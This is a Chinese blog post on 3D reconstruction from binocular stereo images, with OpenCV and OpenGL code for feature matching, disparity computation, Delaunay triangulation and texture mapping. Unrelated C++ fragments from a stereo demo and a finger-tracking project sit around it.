	running = true;
	while (running)
	{
		// Prepare disparity map of specified type
		Mat disp;
		oclMat d_disp;
		workBegin();
		switch (method)
		{
		case BM:
			if (d_left.channels() > 1 || d_right.channels() > 1)
			{
				cout << "BM doesn't support color images\n";
				cvtColor(left_src, left, CV_BGR2GRAY);
				cvtColor(right_src, right, CV_BGR2GRAY);
				cout << "image_channels: " << left.channels() << endl;
				d_left.upload(left);
				d_right.upload(right);
				imshow("left", left);
				imshow("right", right);
			}
			bm(d_left, d_right, d_disp);
			break;
		case BP:
			bp(d_left, d_right, d_disp);
			break;
		case CSBP:
			csbp(d_left, d_right, d_disp);
			break;
		}

		// Show results
		d_disp.download(disp);
		workEnd();

		if (method != BM)
		{
			disp.convertTo(disp, 0);
		}
		putText(disp, text(), Point(5, 25), FONT_HERSHEY_SIMPLEX, 1.0, Scalar::all(255));
		imshow("disparity", disp);
		if(write_once)
		{
			imwrite(out_img, disp);
			write_once = false;
		}
		handleKey((char)waitKey(3));
	}
}


void App::printParams() const
{
	cout << "--- Parameters ---\n";
	cout << "image_size: (" << left.cols << ", " << left.rows << ")\n";
	cout << "image_channels: " << left.channels() << endl;
	cout << "method: " << method_str() << endl
		<< "ndisp: " << ndisp << endl;
	switch (method)
	{
	case BM:
		cout << "win_size: " << bm.winSize << endl;
		cout << "prefilter_sobel: " << bm.preset << endl;
		break;
	case BP:
		cout << "iter_count: " << bp.iters << endl;
		cout << "level_count: " << bp.levels << endl;
		break;
	case CSBP:
		cout << "iter_count: " << csbp.iters << endl;
		cout << "level_count: " << csbp.levels << endl;
		break;
	}
	cout << endl;
}


void App::handleKey(char key)
{
	switch (key)
	{
	case 27:
		running = false;
		break;
	case 'p':
	case 'P':
		printParams();
		break;
	case 'g':
	case 'G':
		if (left.channels() == 1 && method != BM)
		{
			left = left_src;
			right = right_src;
		}
		else
		{
			cvtColor(left_src, left, CV_BGR2GRAY);
			cvtColor(right_src, right, CV_BGR2GRAY);
		}
		d_left.upload(left);
		d_right.upload(right);
		cout << "image_channels: " << left.channels() << endl;
		imshow("left", left);
		imshow("right", right);
		break;
	case 'm':
	case 'M':
		switch (method)
		{
		case BM:
			method = BP;
			break;
		case BP:
			method = CSBP;
			break;
		case CSBP:
			method = BM;
			break;
		}
		cout << "method: " << method_str() << endl;
		break;
	case 's':
	case 'S':
		if (method == BM)
		{
			switch (bm.preset)
			{
			case StereoBM_OCL::BASIC_PRESET:
				bm.preset = StereoBM_OCL::PREFILTER_XSOBEL;
				break;
			case StereoBM_OCL::PREFILTER_XSOBEL:
				bm.preset = StereoBM_OCL::BASIC_PRESET;
				break;
			}
			cout << "prefilter_sobel: " << bm.preset << endl;
		}
		break;
	case '1':
		ndisp == 1 ? ndisp = 8 : ndisp += 8;
		cout << "ndisp: " << ndisp << endl;
		bm.ndisp = ndisp;
		bp.ndisp = ndisp;
		csbp.ndisp = ndisp;
		break;
	case 'q':
	case 'Q':
		ndisp = max(ndisp - 8, 1);
		cout << "ndisp: " << ndisp << endl;
		bm.ndisp = ndisp;
		bp.ndisp = ndisp;
		csbp.ndisp = ndisp;
		break;
	case '2':
		if (method == BM)
		{
			bm.winSize = min(bm.winSize + 1, 51);
			cout << "win_size: " << bm.winSize << endl;
		}
		break;
	case 'w':
	case 'W':
		if (method == BM)
		{
			bm.winSize = max(bm.winSize - 1, 2);
			cout << "win_size: " << bm.winSize << endl;
		}
		break;
	case '3':
		if (method == BP)
		{
			bp.iters += 1;
			cout << "iter_count: " << bp.iters << endl;
		}
		else if (method == CSBP)
		{
			csbp.iters += 1;
			cout << "iter_count: " << csbp.iters << endl;
		}
		break;
	case 'e':
	case 'E':
		if (method == BP)
		{
			bp.iters = max(bp.iters - 1, 1);
			cout << "iter_count: " << bp.iters << endl;
		}
		else if (method == CSBP)
		{
			csbp.iters = max(csbp.iters - 1, 1);
			cout << "iter_count: " << csbp.iters << endl;
		}
		break;
	case '4':
		if (method == BP)
		{
			bp.levels += 1;
			cout << "level_count: " << bp.levels << endl;
		}
		else if (method == CSBP)
		{
			csbp.levels += 1;
			cout << "level_count: " << csbp.levels << endl;
		}
		break;
	case 'r':
	case 'R':
		if (method == BP)
		{
			bp.levels = max(bp.levels - 1, 1);
			cout << "level_count: " << bp.levels << endl;
		}
		else if (method == CSBP)
		{
			csbp.levels = max(csbp.levels - 1, 1);
			cout << "level_count: " << csbp.levels << endl;
		}
		break;
	case 'o':
	case 'O':
		write_once = true;
		break;
	}
}

 
 
 










0.绪论
这篇文章主要为了研究双目立体视觉的最终目标——三维重建，系统的介绍了三维重建的整体步骤。双目立体视觉的整体流程包括：图像获取，摄像机标定，特征提取（稠密匹配中这一步可以省略），立体匹配，三维重建。我在做双目立体视觉问题时，主要关注的点是立体匹配，本文主要关注最后一个步骤三维重建中的：三角剖分和纹理贴图以及对应的OpenCV+OpenGL代码实现。
1.视差计算
1.1基于视差信息的三维重建
特征提取 
由双目立体视觉进行三位重建的第一步是立体匹配，通过寻找两幅图像中的对应点获取视差。OpenCV 中的features2d库中包含了很多常用的算法，其中特征点定位的算法有FAST, SIFT, SURF ,MSER, HARRIS等，特征点描述算法有SURF, SIFT等，还有若干种特征点匹配算法。这三个步骤的算法可以任选其一，自由组合，非常方便。经过实验，选择了一种速度、特征点数量和精度都比较好的组合方案：FAST角点检测算法+SURF特征描述子+FLANN(Fast Library for Approximate Nearest Neighbors) 匹配算法。
在匹配过程中需要有一些措施来过滤误匹配。一种比较常用的方法是比较第一匹配结果和第二匹配结果的得分差距是否足够大，这种方法可以过滤掉一些由于相似造成的误匹配。还有一种方法是利用已经找到的匹配点，使用RANSAC算法求得两幅视图之间的单应矩阵，然后将左视图中的坐标P用单应矩阵映射到右视图的Q点，观察与匹配结果Q’的欧氏距离是否足够小。当然由于图像是具有深度的，Q与Q’必定会有差距，因此距离阈值可以设置的稍微宽松一些。我使用了这两种过滤方法。
另外，由于图像有些部分的纹理较多，有些地方则没有什么纹理，造成特征点疏密分布不均匀，影响最终重建的效果，因此我还采取了一个措施：限制特征点不能取的太密。如果新加入的特征点与已有的某一特征点距离太小，就舍弃之。最终匹配结果如下图所示，精度和均匀程度都较好。 

代码：
// choose the corresponding points in the stereo images for 3d reconstruction
void GetPair( Mat &imgL, Mat &imgR, vector<Point2f> &ptsL, vector<Point2f> &ptsR ) 
{
    Mat descriptorsL, descriptorsR;
    double tt = (double)getTickCount();

   Ptr<FeatureDetector> detector = FeatureDetector::create( DETECTOR_TYPE ); // factory mode
    vector<KeyPoint> keypointsL, keypointsR; 
    detector->detect( imgL, keypointsL );
    detector->detect( imgR, keypointsR );

    Ptr<DescriptorExtractor> de = DescriptorExtractor::create( DESCRIPTOR_TYPE );
    //SurfDescriptorExtractor de(4,2,true);
    de->compute( imgL, keypointsL, descriptorsL );
    de->compute( imgR, keypointsR, descriptorsR );

    tt = ((double)getTickCount() - tt)/getTickFrequency(); // 620*555 pic, about 2s for SURF, 120s for SIFT

    Ptr<DescriptorMatcher> matcher = DescriptorMatcher::create( MATCHER_TYPE );
    vector<vector<DMatch>> matches;
    matcher->knnMatch( descriptorsL, descriptorsR, matches, 2 ); // L:query, R:train

    vector<DMatch> passedMatches; // save for drawing
    DMatch m1, m2;
    vector<Point2f> ptsRtemp, ptsLtemp;
    for( size_t i = 0; i < matches.size(); i++ )
    {
        m1 = matches[i][0];
        m2 = matches[i][1];
        if (m1.distance < MAXM_FILTER_TH * m2.distance)
        {
            ptsRtemp.push_back(keypointsR[m1.trainIdx].pt);
            ptsLtemp.push_back(keypointsL[i].pt);
            passedMatches.push_back(m1);
        }
    }

    Mat HLR;
    HLR = findHomography( Mat(ptsLtemp), Mat(ptsRtemp), CV_RANSAC, 3 );
    cout<<"Homography:"<<endl<<HLR<<endl;
    Mat ptsLt; 
    perspectiveTransform(Mat(ptsLtemp), ptsLt, HLR);

    vector<char> matchesMask( passedMatches.size(), 0 );
    int cnt = 0;
    for( size_t i1 = 0; i1 < ptsLtemp.size(); i1++ )
    {
        Point2f prjPtR = ptsLt.at<Point2f>((int)i1,0); // prjx = ptsLt.at<float>((int)i1,0), prjy = ptsLt.at<float>((int)i1,1);
         // inlier
        if( abs(ptsRtemp[i1].x - prjPtR.x) < HOMO_FILTER_TH &&
            abs(ptsRtemp[i1].y - prjPtR.y) < 2) // restriction on y is more strict
        {
            vector<Point2f>::iterator iter = ptsL.begin();
            for (;iter!=ptsL.end();iter++)
            {
                Point2f diff = *iter - ptsLtemp[i1];
                float dist = abs(diff.x)+abs(diff.y);
                if (dist < NEAR_FILTER_TH) break;
            }
            if (iter != ptsL.end()) continue;

            ptsL.push_back(ptsLtemp[i1]);
            ptsR.push_back(ptsRtemp[i1]);
            cnt++;
            if (cnt%1 == 0) matchesMask[i1] = 1; // don't want to draw to many matches
        }
    }

    Mat outImg;
    drawMatches(imgL, keypointsL, imgR, keypointsR, passedMatches, outImg, 
        Scalar::all(-1), Scalar::all(-1), matchesMask, DrawMatchesFlags::NOT_DRAW_SINGLE_POINTS);
    char title[50];
    sprintf_s(title, 50, "%.3f s, %d matches, %d passed", tt, matches.size(), cnt);
    imshow(title, outImg);
    waitKey();
}
p.s. 源代码中的基于特征点的视差计算有点问题，还在调试中，希望有经验的大牛共同解决一下。

最新回复，特别鸣谢大神：G3fire(update 20180718)
代码在opencv2.4.9版本下运行的，由于SIFT和SURF的专利约束需要nofree的引用.

在Reconstuction3d.cpp中添加initModule_nonfree();
同样在head.h中添加
#pragma comment(lib,"opencv_nonfree249d.lib")，
把Algorithm g_algo 改成= FEATURE_PT
就可以运行基于特征点的视差计算了 

楼24的修改特征点检测的创建方法没有运行通

特别感谢24楼的回复
博主的特征点匹配这边运行时会崩溃，我用VS2013+opencv2.4.10版本，然后修改特征点检测的创建方法就可以用了。
例如：
SurfFeatureDetector detector;
detector.detect(imgL1, keypointsL); 
detector.detect(imgR1, keypointsR);

1.2基于块匹配的视差计算
上面提取特征点的过程中实际上忽略了一个辅助信息：对应点应当是取在对应极线上的一个区间内的。利用这个信息可以大幅简化对应点的匹配，事实上只要用L1距离对一个像素周围的block计算匹配距离就可以了，也就是OpenCV中实现的块匹配算法的基本思路。比起特征点匹配，这是一种“稠密”的匹配算法，精度也可以接受。下图中浅色表示视差较大，对应深度较浅。左侧有一块区域是左右视图不相交的部分，因此无法计算视差。 
 
可以发现视差计算结果中有很多噪声。事实上在纹理平滑的区域，还有左右视图中不同遮挡的区域，是很难计算视差的。因此我利用最近邻插值和数学形态学平滑的方法对视差图进行了修复（见cvFuncs2.cpp中的FixDisparity函数）： 

// roughly smooth the glitches on the disparity map
void FixDisparity( Mat_<float> & disp, int numberOfDisparities ) 
{
    Mat_<float> disp1;
    float lastPixel = 10;
    float minDisparity = 23;// algorithm parameters that can be modified
    for (int i = 0; i < disp.rows; i++)
    {
        for (int j = numberOfDisparities; j < disp.cols; j++)
        {
            if (disp(i,j) <= minDisparity) disp(i,j) = lastPixel;
            else lastPixel = disp(i,j);
        }
    }
     int an = 4;    // algorithm parameters that can be modified
    copyMakeBorder(disp, disp1, an,an,an,an, BORDER_REPLICATE);
    Mat element = getStructuringElement(MORPH_ELLIPSE, Size(an*2+1, an*2+1));
    morphologyEx(disp1, disp1, CV_MOP_OPEN, element);
    morphologyEx(disp1, disp1, CV_MOP_CLOSE, element);
    disp = disp1(Range(an, disp.rows-an), Range(an, disp.cols-an)).clone();
}
对应点的选取 
上面提到，为了获得较好的重构效果，特征点最好取在深度变化较大的区域。基于这种猜想，我首先对上面的视差图求梯度，然后找到梯度最大的点，观察梯度的方向，如果是偏x方向，就在该点左右若干像素各取一个点；否则就在上下若干像素各取一个点。然后根据这两个点的视差值就可以计算出另外一个视图中的对应点的坐标。特征点还不能分布过密，因此我取完一对特征点后，将其周围一圈像素的梯度置零，然后在寻找下一个梯度最大值，这样一直下去，直到取够特征点数。 
特征点也不能全取在深度变化剧烈的区域，在平坦的区域也可以取一些。最终我取的特征点如下图： 
 
其中紫色的点是在较平坦的区域取到的，其他颜色是在边界区域取到的。这些算法实现在ChooseKeyPointsBM函数中。
2.计算世界坐标
一般双目立体视觉中使用的实验图像都是经过外极线矫正的，计算3D坐标也比较方便，其实利用外极线约束（以及其他的约束条件）可以极大的降低立体匹配的计算量。见下图： 
 
如果(x1,y1),(x2,y2)用各自图像上的像素坐标表示，L和(X,Y,Z)用毫米表示，f用像素表示的话，用相似三角形的知识就可以推出： 
 
其中W和H是图像的宽高（像素数），y是y1和y2的均值，Z加负号是为了保持右手坐标系，而Y加负号是由于图像成像过程中上下发生了倒转。三维世界原点取为左摄像机的焦点。计算的代码见cvFunc.cpp中的StereoTo3D函数。
 // calculate 3d coordinates.
// for rectified stereos: pointLeft.y == pointRight.y
// the origin for both image is the top-left corner of the left image.
// the x-axis points to the right and the y-axis points downward on the image.
// the origin for the 3d real world is the optical center of the left camera
// object -> optical center -> image, the z value decreases.

void StereoTo3D( vector<Point2f> ptsL, vector<Point2f> ptsR, vector<Point3f> &pts3D,
                float focalLenInPixel, float baselineInMM, Mat img,
                Point3f &center3D, Vec3f &size3D) // output variable, the center coordinate and the size of the object described by pts3D
{
    vector<Point2f>::iterator iterL = ptsL.begin(),
        iterR = ptsR.begin();

    float xl, xr, ylr;
    float imgH = float(img.rows), imgW = float(img.cols);
    Point3f pt3D;
    float minX = 1e9, maxX = -1e9;
    float minY = 1e9, maxY = -1e9;
    float minZ = 1e9, maxZ = -1e9;

    Mat imgShow = img.clone();
    char str[100];
    int ptCnt = ptsL.size(), showPtNum = 30, cnt = 0;
    int showIntv = max(ptCnt/showPtNum, 1);
    for ( ; iterL != ptsL.end(); iterL++, iterR++)
    {
        xl = iterL->x;
        xr = iterR->x; // need not add baseline
        ylr = (iterL->y + iterR->y)/2;

        //if (yl-yr>5 || yr-yl>5) // may be wrong correspondence, discard. But vector can't be changed during iteration
        //{}

        pt3D.z = -focalLenInPixel * baselineInMM / (xl-xr); // xl should be larger than xr, if xl is shot by the left camera
        pt3D.y = -(-ylr + imgH/2) * pt3D.z / focalLenInPixel;
        pt3D.x = (imgW/2 - xl) * pt3D.z / focalLenInPixel;

        minX = min(minX, pt3D.x); maxX = max(maxX, pt3D.x);
        minY = min(minY, pt3D.y); maxY = max(maxY, pt3D.y);
        minZ = min(minZ, pt3D.z); maxZ = max(maxZ, pt3D.z);
        pts3D.push_back(pt3D);

        if ((cnt++)%showIntv == 0)
        {
            Scalar color = CV_RGB(rand()&64,rand()&64,rand()&64);
            sprintf_s(str, 100, "%.0f,%.0f,%.0f", pt3D.x, pt3D.y, pt3D.z);
            putText(imgShow, str, Point(xl-13,ylr-3), FONT_HERSHEY_SIMPLEX, .3, color);
            circle(imgShow, *iterL, 2, color, 3);
        }

    }

    imshow("back project", imgShow);
    waitKey();

    center3D.x = (minX+maxX)/2;
    center3D.y = (minY+maxY)/2;
    center3D.z = (minZ+maxZ)/2;
    size3D[0] = maxX-minX;
    size3D[1] = maxY-minY;
    size3D[2] = maxZ-minZ;
}
3.三角剖分
3.1 三角剖分简介
三角剖分是为了之后的纹理贴图，我用了OpenCV中的Delaunay三角剖分函数，这种剖分算法的可以使所形成的三角形的最小角最大。剖分的示例如下：
 
OpenCV使用Delaunay算法将平面分割成小的三角形区域（该三角形确保包括所有的分割点）开始不断迭代完成。在这种情况下，对偶划分就是输入的二维点集的Voronoi图表。这种划分可以用于对一个平面进行三维分段变换、形态变换、平面点的快速 定位以及建立特定的图结构（如NNG,RNG）。
 
同时由表可以看出，三角网生成法的时间效率最低，分治算法的时间效率最高，逐点插入法效率居中。
3.2 Bowyer-Watson算法
目前采用逐点插入方式生成的Delaunay三角网的算法主要基于Bowyer-Watson算法，Bowyer-Watson算法的主要步骤如下：
1）建立初始三角网格：针对给定的点集V,找到一个包含该点集的矩形R,我们称R为辅助窗口。连接R的任意一条对角线，形成两个三角形，作为初始Delaunay三角网格。
2）逐点插入：假设目前已经有一个Delaunay三角网格T,现在在它里面再插入一个点P,需要找到该点P所在的三角形。从P所在的三角形开始，搜索该三角形的邻近三角形，并进行空外接圆检测。找到外接圆包含点P的所有的三角形并删除这些三角形，形成一个包含P的多边形空腔，我们称之为Delaunay空腔。然后连接P与Delaunay腔的每一个顶点，形成新的Delaunay三角网格。
3）删除辅助窗口R:重复步骤2）,当点集V中所有点都已经插入到三角形网格中后，将顶点包含辅助窗口R的三角形全部删除。
在这些步骤中，快速定位点所在的三角形、确定点的影响并构建Delaunay腔的过程是每插入一个点都会进行的。随着点数的增加，三角形数目增加很快，因此缩短这两个过程的计算时间，是提高算法效率的关键。 
算法执行图示如下： 

3.3 三角剖分代码分析
三角剖分的代码见cvFuncs.cpp中的TriSubDiv函数，我将特征点存储到一个vector变量中，剖分结果存储到一个vector变量中，Vec3i中存储的是3个表示顶点编号的整数。
我们需要存储Delaunay的内存空间和一个外接矩形（该矩形盒子用来确定虚拟三角形）
// STORAGE AND STRUCTURE FOR DELAUNAY SUBDIVISION //存储和结构 for三角剖分  
//  
CvRect rect = { 0, 0, 600, 600 };  //Our outer bounding box //我们的外接边界盒子  
CvMemStorage* storage;    //Storage for the Delaunay subdivsion //用来存储三角剖分  
storage = cvCreateMemStorage(0);    //Initialize the storage //初始化存储器  
CvSubdiv2D* subdiv; //The subdivision itself // 细分  
subdiv = init_delaunay( storage, rect);   //See this function below //函数返回CvSubdiv类型指针  
init_delaunay函数如下，它是一个OpenCV函数，是一个包含一些OpenCV函数的函数包。
//INITIALIZATION CONVENIENCE FUNCTION FOR DELAUNAY SUBDIVISION //为三角剖分初始化便利函数  
//  
CvSubdiv2D* init_delaunay(CvMemStorage* storage,CvRect rect) {  
CvSubdiv2D* subdiv;  
subdiv = cvCreateSubdiv2D(CV_SEQ_KIND_SUBDIV2D,sizeof(*subdiv),sizeof(CvSubdiv2DPoint),sizeof(CvQuadEdge2D),storage);//为数据申请空间  
cvInitSubdivDelaunay2D( subdiv, rect ); //rect sets the bounds  
return subdiv;//返回申请空间的指针  
}  
我们知道三角剖分是对散点集进行处理的，我们知道了散点集就可以获得点集的三角剖分。如何传入（插入）散点集呢？ 
这些点必须是32位浮点型，并通过下面的方式插入点：
CvPoint2D32f fp; //This is our point holder//这是我们点的持有者（容器）  
for( i = 0; i < as_many_points_as_you_want; i++ ) {  
// However you want to set points //如果我们的点集不是32位的，在这里我们将其转为CvPoint2D32f，如下两种方法。  
//  
fp = your_32f_point_list[i];  
cvSubdivDelaunay2DInsert( subdiv, fp );  
}  
转换为CvPoint2D32f的两种方法： 
1）通过宏cvPoint2D32f(double x,double y) 
2）通过cxtype.h下的cvPointTo32f(CvPoint point)函数将整形点方便的转换为32位浮点型。 
当可以通过输入点（散点集）得到Delaunay三角剖分后，接下来，我们用一下两个函数设置和清除相关的Voronoi划分：
cvCalcSubdivVoronoi2D( subdiv ); // Fill out Voronoi data in subdiv //在subdiv中填充Vornoi的数据  
cvClearSubdivVoronoi2D( subdiv ); // Clear the Voronoi from subdiv//从subdiv中清除Voronoi的数据  
CvSubdiv2D结构如下：
#define CV_SUBDIV2D_FIELDS() \  
CV_GRAPH_FIELDS() \  
int quad_edges; \  
int is_geometry_valid; \  
CvSubdiv2DEdge recent_edge; \  
CvPoint2D32f topleft; \  
CvPoint2D32f bottomright;  
typedef struct CvSubdiv2D  
{  
CV_SUBDIV2D_FIELDS()  
}  
CvSubdiv2D;  
#define CV_GRAPH_FIELDS()               \  
CV_SET_FIELDS() /* set of vertices */   \  
CvSet *edges;  /* set of edges    */  
#define CV_SET_FIELDS()                                            \  
CV_SEQUENCE_FIELDS()             /*inherits from [#CvSeq CvSeq] */ \  
struct CvSetElem* free_elems;   /*list of free nodes           */  
整体代码如下：
void TriSubDiv( vector<Point2f> &pts, Mat &img, vector<Vec3i> &tri ) 
{
    CvSubdiv2D* subdiv;//The subdivision itself // 细分 
    CvMemStorage* storage = cvCreateMemStorage(0); ;//Storage for the Delaunay subdivsion //用来存储三角剖分 
    Rect rc = Rect(0,0, img.cols, img.rows); //Our outer bounding box //我们的外接边界盒子 

    subdiv = cvCreateSubdiv2D( CV_SEQ_KIND_SUBDIV2D, sizeof(*subdiv),
        sizeof(CvSubdiv2DPoint),
        sizeof(CvQuadEdge2D),
        storage );//为数据申请空间  

    cvInitSubdivDelaunay2D( subdiv, rc );//rect sets the bounds 

    //如果我们的点集不是32位的，在这里我们将其转为CvPoint2D32f，如下两种方法。
    for (size_t i = 0; i < pts.size(); i++)
    {
        CvSubdiv2DPoint *pt = cvSubdivDelaunay2DInsert( subdiv, pts[i] );
        pt->id = i;
    }

    CvSeqReader reader;
    int total = subdiv->edges->total;
    int elem_size = subdiv->edges->elem_size;

    cvStartReadSeq( (CvSeq*)(subdiv->edges), &reader, 0 );
    Point buf[3];
    const Point *pBuf = buf;
    Vec3i verticesIdx;
    Mat imgShow = img.clone();

    srand( (unsigned)time( NULL ) );   
    for( int i = 0; i < total; i++ ) 
    {   
        CvQuadEdge2D* edge = (CvQuadEdge2D*)(reader.ptr);   

        if( CV_IS_SET_ELEM( edge )) 
        {
            CvSubdiv2DEdge t = (CvSubdiv2DEdge)edge; 
            int iPointNum = 3;
            Scalar color = CV_RGB(rand()&255,rand()&255,rand()&255);

            //bool isNeg = false;
            int j;
            for(j = 0; j < iPointNum; j++ )
            {
                CvSubdiv2DPoint* pt = cvSubdiv2DEdgeOrg( t );
                if( !pt ) break;
                buf[j] = pt->pt;
                //if (pt->id == -1) isNeg = true;
                verticesIdx[j] = pt->id;
                t = cvSubdiv2DGetEdge( t, CV_NEXT_AROUND_LEFT );
            }
            if (j != iPointNum) continue;
            if (isGoodTri(verticesIdx, tri))
            {
                //tri.push_back(verticesIdx);
                polylines( imgShow, &pBuf, &iPointNum, 
                    1, true, color,
                    1, CV_AA, 0);
                //printf("(%d, %d)-(%d, %d)-(%d, %d)\n", buf[0].x, buf[0].y, buf[1].x, buf[1].y, buf[2].x, buf[2].y);
                //printf("%d\t%d\t%d\n", verticesIdx[0], verticesIdx[1], verticesIdx[2]);
                //imshow("Delaunay", imgShow);
                //waitKey();
            }

            t = (CvSubdiv2DEdge)edge+2;

            for(j = 0; j < iPointNum; j++ )
            {
                CvSubdiv2DPoint* pt = cvSubdiv2DEdgeOrg( t );
                if( !pt ) break;
                buf[j] = pt->pt;
                verticesIdx[j] = pt->id;
                t = cvSubdiv2DGetEdge( t, CV_NEXT_AROUND_LEFT );
            }   
            if (j != iPointNum) continue;
            if (isGoodTri(verticesIdx, tri))
            {
                //tri.push_back(verticesIdx);
                polylines( imgShow, &pBuf, &iPointNum, 
                    1, true, color,
                    1, CV_AA, 0);
                //printf("(%d, %d)-(%d, %d)-(%d, %d)\n", buf[0].x, buf[0].y, buf[1].x, buf[1].y, buf[2].x, buf[2].y);
                //printf("%d\t%d\t%d\n", verticesIdx[0], verticesIdx[1], verticesIdx[2]);
                //imshow("Delaunay", imgShow);
                //waitKey();
            }
        }

        CV_NEXT_SEQ_ELEM( elem_size, reader );

    }

    //RemoveDuplicate(tri);
    char title[100];
    sprintf_s(title, 100, "Delaunay: %d Triangles", tri.size());
    imshow(title, imgShow);
    waitKey();
}
平面划分是将一个平面分割为一组不重叠的、能够覆盖整个平面的区域。结构CvSubdiv2D描述了建立在二维点集上的划分结构，其中点集互相连接且构成平面图形，该图形通过结合一些无线连接外部划分点（称为凸形点）的边缘，将一个平面用按照其边缘划分成很多小区域。
对于每一个划分操作，都有一个对偶划分与之对应。对偶的意思是小区域与点（划分的顶点）变换角色，即在对偶划分中，小区域被当做一个顶点（以下称为虚拟点）而原始的划分顶点被当做小区域。如下图所示，原始的划分用实线表示，而对偶划分用虚线表示。
4.三维重构
为了保证三维重建的效果，一般地要对深度图像进行后续处理。要从深度图像中恢复高质量的视差图，对深度图像的要求有： 
①深度图像中，物体的边界必需与图像中物体的边界对齐； 
②在场景图中，深度图像要尽可能均勻和平滑，即对图像进行平滑处理。
三维重构的思路很简单，用OpenGL中纹理贴图功能，将平面图像中的三角形逐个贴到计算出的三维坐标上去就可以了。为了便于观察3D效果，我还设计了交互功能：用方向键可以上下左右旋转重构的模型，用鼠标滚轮可以放大或缩小。用gluLookAt函数可以实现视点旋转的功能。三维重构的代码实现在glFuncs.cpp中。
纹理贴图：
GLuint Create3DTexture( Mat &img, vector<Vec3i> &tri, 
                       vector<Point2f> pts2DTex, vector<Point3f> &pts3D, 
                        Point3f center3D, Vec3f size3D ) 
{
    GLuint tex = glGenLists(1);
    int error = glGetError();
    if (error != GL_NO_ERROR) 
        cout << "An OpenGL error has occured: " << gluErrorString(error) << endl;
    if (tex == 0) return 0;

    Mat texImg;
    cvtColor(img, img, CV_BGR2RGB);
    resize(img, texImg, Size(512,512)); // seems no need to do this

    glNewList(tex, GL_COMPILE);

    vector<Vec3i>::iterator iterTri = tri.begin();
    //vector<Point3f>::iterator iterPts3D = pts3D.begin();
    Point2f pt2D[3];
    Point3f pt3D[3];

    glDisable(GL_BLEND);
    glEnable(GL_TEXTURE_2D);
    for ( ; iterTri != tri.end(); iterTri++)
    {
        Vec3i &vertices = *iterTri;
        int ptIdx;
        for (int i = 0; i < 3; i++)
        {
            ptIdx = vertices[i];
            if (ptIdx == -1) break;
            //else cout<<ptIdx<<"\t";
            pt2D[i].x = pts2DTex[ptIdx].x / img.cols;
            pt2D[i].y = pts2DTex[ptIdx].y / img.rows;
            pt3D[i] = (pts3D[ptIdx] - center3D) * (1.f / max(size3D[0],size3D[1]));
            //pt3D[i].z -= offset;
        }

        if (ptIdx != -1)
        {
            MapTexTri(texImg, pt2D, pt3D);
            //cout<<endl;
        }
    }
    glDisable(GL_TEXTURE_2D);

    glEndList();
    return tex;

}
效果展示及不足 
Cloth图像是重构效果比较好的一组：

可以比较明显的看出3D效果，也比较符合直觉。然而其他图像效果就差强人意了：

仔细分析造成这种效果的原因，一方面，特征点的匹配可能有些误差，造成3D坐标的计算不太精确，但大部分坐标还是准确的。另一方面，左右视图可能会有不同的遮挡、偏移等情况，因此匹配得到的特征点可能实际上并不是3维世界中的同一点，这种误差是无法消除的。但造成效果变差的最重要的原因，还是图像中深度变化较大，而特征点选取的比较稀疏，因此正面看还比较正常，一旦旋转纹理就显得扭曲变形了。为了解决这个问题，应当试图把特征点取到深度变化较剧烈的地方，一般是图像中的边界处。然而特征点检测一般都检测出的是角点和纹理密集的区域，因此可以考虑更换对应点匹配的方法。
如果要进一步改进效果，可以先对视差图像进行分割，将图像分成视差比较连续的几块区域分别贴图，视差变化剧烈的区域就不必把扭曲的纹理贴上去了。我尝试了以下分割的效果，如下图所示，应该可以达到更好的效果，不过由于时间所限，就没有进一步实现下去了。
关于上面实现的两种求取视差的算法，在main函数的前面设置了一个变量g_algo，可以用来切换不同的算法。
参考文献：

立体匹配原理：
http://blog.csdn.net/wangyaninglm/article/details/51533549 
http://blog.csdn.net/wangyaninglm/article/details/51531333 
  三维重建原理：
http://blog.csdn.net/wangyaninglm/article/details/51558656 
http://blog.csdn.net/wangyaninglm/article/details/51558310 
  三角剖分原理：
http://blog.csdn.net/newthinker_wei/article/details/45598769 
http://www.learnopencv.com/delaunay-triangulation-and-voronoi-diagram-using-opencv-c-python/ 
这篇文章其实主要是针对早期下到的一个代码和文档的总结，和一些个人资料的总结，由于时间比较早，找不到出处了，如果原作者看到了觉的不妥，那我就把它改成转载啦，嘿嘿嘿。

代码下载

CSDN:    http://download.csdn.net/detail/wangyaninglm/9597622 
  github：https://github.com/wynshiter/OpenCV-OpenGL–Reconstuction3d
 






 
另外一篇文章地址：这个比较详细，但是程序略显简单，现在这个程序是比较复杂的
http://blog.csdn.net/wangyaninglm/article/details/17091901
 
 
整个项目下载地址：
 
http://download.csdn.net/detail/wangyaninglm/8244549
 
 
实现效果：
 

 
 
 
Finger.h
#ifndef __TOUCHSCREEN_FINGER__
#define __TOUCHSCREEN_FINGER__

#include <cxcore.h>
#include <vector>

class Finger
{
public:
	Finger()
	{
		area = 0.0f;	
		w=h=0;
	};
public:
	CvPoint center;
	float area;
	float w;
	float h;
};


//typedef std::vector<Finger> FingerTrack;	


class FingerTrack
{
public:
	FingerTrack()
	{
		states=0;
		lostCount =0;
	}
	std::vector<Finger> track;
	int states;
	int lostCount;

};

#endif 

 
 
MachineLearning.h
 
#include <cxcore.h>
#include <cv.h>
#include <ml.h>
#include <string>
using namespace std ;
class MachineLearning
{
	enum TraningMethod 
	{
		RandomTrees,
		Boosting,
		NeuralNetworks,
		SVM
	};

public:
	bool getCrossFeature(IplImage *img,float featureData[]);
	bool predict(char &shape_type,float featureData[]);
	bool load(const char *training_filename);
	bool train(const  char *data_filename,const  char *save_filename);
	MachineLearning(void);
	void ExtractDFT(float pcadata[],const int featureData[],const int &dataWidth,const int &DFTwidth);
	int DataCount;

private:
	static const int CROSS_COLS = 50;
	static const int CROSS_ROWS = 50;
	void getCrossFeatureData(IplImage *img_cross,int featureData[],const int &cols,const int &rows );
	void getDistanceFeatureData(IplImage *img_cross,int featureData[],const int &cols,const int &rows );
	void getCrossCenter(IplImage *img_cross,int &cx,int &cy);
	void getCrossSpecifyArea(IplImage *img_cross,CvRect &specifie_rect);
	void ExtractPCA(float pcadata[],const int featureData[],const int &dataWidth );

	bool is_load_training_model; 
	TraningMethod  traning_method;
	int read_num_class_data( const char* filename, int var_count,CvMat** data, CvMat** responses);
	int build_rtrees_classifier(const char* data_filename,const char* filename_to_save,const char* filename_to_load);
	int build_boost_classifier( char* data_filename,char* filename_to_save, char* filename_to_load );
	int build_mlp_classifier( char* data_filename,char* filename_to_save, char* filename_to_load );
	int build_svm_classifier( char* data_filename,char* filename_to_save, char* filename_to_load );

	CvRTrees forest;
	int predict_rtrees_classifier(CvMat *sample_data,char &shape_type);



};


 
 
machinelearning.cpp
 
/*************************************************
